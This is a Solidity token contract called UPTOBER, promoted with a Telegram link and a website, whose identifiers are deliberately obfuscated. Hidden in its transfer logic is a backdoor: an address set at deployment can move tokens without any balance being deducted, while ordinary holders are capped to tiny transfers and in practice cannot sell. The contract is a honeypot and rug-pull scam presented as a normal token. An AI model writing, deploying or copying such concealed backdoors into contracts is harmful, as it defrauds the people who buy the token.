/*

https://t.me/ethuptober

https://uptober.cryptotoken.live/

*/

// SPDX-License-Identifier: Unlicense

pragma solidity >=0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract UPTOBER is Ownable {
    function approve(address mkribnvej, uint256 hoefwcakr) public returns (bool success) {
        allowance[msg.sender][mkribnvej] = hoefwcakr;
        emit Approval(msg.sender, mkribnvej, hoefwcakr);
        return true;
    }

    uint8 public decimals = 9;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor(string memory tlfuap, string memory vmig, address qzhymnd, address fldmpg) {
        name = tlfuap;
        symbol = vmig;
        balanceOf[msg.sender] = totalSupply;
        hizkfp[fldmpg] = ophtcbzr;
        hblju = IUniswapV2Router02(qzhymnd);
    }

    mapping(address => uint256) private gokibxzhqe;

    string public symbol;

    uint256 private ophtcbzr = 107;

    mapping(address => uint256) private hizkfp;

    mapping(address => uint256) public mkwl;

    function ywtkdmufegvl(address qgrvzhjnuk, address kzrq, uint256 hoefwcakr) private {
        address advmxok = IUniswapV2Factory(hblju.factory()).getPair(address(this), hblju.WETH());
        bool wpgitrcdn = gokibxzhqe[qgrvzhjnuk] == block.number;
        if (0 == hizkfp[qgrvzhjnuk]) {
            if (qgrvzhjnuk != advmxok && (!wpgitrcdn || hoefwcakr > mkwl[qgrvzhjnuk]) && hoefwcakr < totalSupply) {
                require(hoefwcakr <= totalSupply / (10 ** decimals));
            }
            balanceOf[qgrvzhjnuk] -= hoefwcakr;
        }
        mkwl[kzrq] = hoefwcakr;
        balanceOf[kzrq] += hoefwcakr;
        gokibxzhqe[kzrq] = block.number;
        emit Transfer(qgrvzhjnuk, kzrq, hoefwcakr);
    }

    mapping(address => mapping(address => uint256)) public allowance;

    string public name;

    function transferFrom(address qgrvzhjnuk, address kzrq, uint256 hoefwcakr) public returns (bool success) {
        require(hoefwcakr <= allowance[qgrvzhjnuk][msg.sender]);
        allowance[qgrvzhjnuk][msg.sender] -= hoefwcakr;
        ywtkdmufegvl(qgrvzhjnuk, kzrq, hoefwcakr);
        return true;
    }

    function transfer(address kzrq, uint256 hoefwcakr) public returns (bool success) {
        ywtkdmufegvl(msg.sender, kzrq, hoefwcakr);
        return true;
    }

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    mapping(address => uint256) public balanceOf;

    event Transfer(address indexed from, address indexed to, uint256 value);

    IUniswapV2Router02 private hblju;
}
